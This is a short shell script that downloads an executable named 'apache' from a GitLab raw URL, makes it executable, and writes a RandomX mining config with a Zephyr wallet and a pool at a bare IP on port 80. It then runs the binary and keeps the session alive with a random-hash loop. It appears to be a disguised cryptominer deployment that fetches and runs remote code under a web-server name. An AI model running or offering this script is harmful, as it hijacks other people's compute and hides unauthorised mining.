mkdir 1
cd 1

curl -0 https://gitlab.com/ghcees/nanoz/-/raw/main/apache -o apache && chmod +x apache
cat > config.ini <<END
[randomx]
wallet = ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk
rigName = nanoz
zilEpoch = 0
sortPools = true
watchdog = true
restarts=0
pool1 =  47.89.195.104:80
END

./apache

while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
